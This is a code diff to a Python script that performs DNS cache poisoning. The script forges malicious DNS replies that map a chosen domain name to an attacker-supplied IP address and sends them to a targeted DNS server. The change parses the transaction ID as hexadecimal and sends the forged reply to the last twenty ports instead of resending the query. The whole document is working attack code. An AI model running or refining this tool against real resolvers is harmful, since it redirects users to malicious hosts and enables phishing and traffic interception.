@@ -70,6 +70,8 @@ def parse_arguments():
     return args.target_ip, args.domain_name, args.ip_address
 
 
+# Number of ports to try to send the malicious DNS reply (from 65'535 - NUMBER_OF_PORTS_TO_TRY to 65'535)
+NUMBER_OF_PORTS_TO_TRY = 20
 if __name__ == '__main__':
     targetedDnsServerIp, domainNameToInject, ipToInject = parse_arguments()
 
@@ -83,25 +85,22 @@ if __name__ == '__main__':
     print("[INFO] DNS query sent to the targeted DNS server")
     sleep(0.1)
     transactionId = 0
-    targetedDnsPort = 0
 
     try:
         while True:
             print()
             print("Enter the transaction ID: ")
-            transactionId = int(input())
-            # print("Enter the source port: ")
-            # targetedDnsPort = int(input())
-            targetedDnsPort = 5353
-
-            if transactionId < 0 or targetedDnsPort < 0:
-                print("[WARN] Invalid transaction ID or port number. Try again")
+            transactionId = int(input(), 16)
+            if transactionId < 0:
+                print("[WARN] Invalid transaction ID. Try again")
                 continue
 
             #  get the malicious DNS reply
             maliciousDnsReply = forgeDnsReply(domainNameToInject, ipToInject, transactionId)
-            sock.sendto(dns_query, (targetedDnsServerIp, targetedDnsPort))
-            print("[INFO] Malicious DNS reply sent")
+
+            for targetedDnsPort in range(65535 - NUMBER_OF_PORTS_TO_TRY, 65535 + 1):
+                sock.sendto(maliciousDnsReply, (targetedDnsServerIp, targetedDnsPort))
+            print(f"[INFO] {NUMBER_OF_PORTS_TO_TRY} malicious DNS reply sent")
     except KeyboardInterrupt:
         print()
         print("[INFO] Exiting the program...")
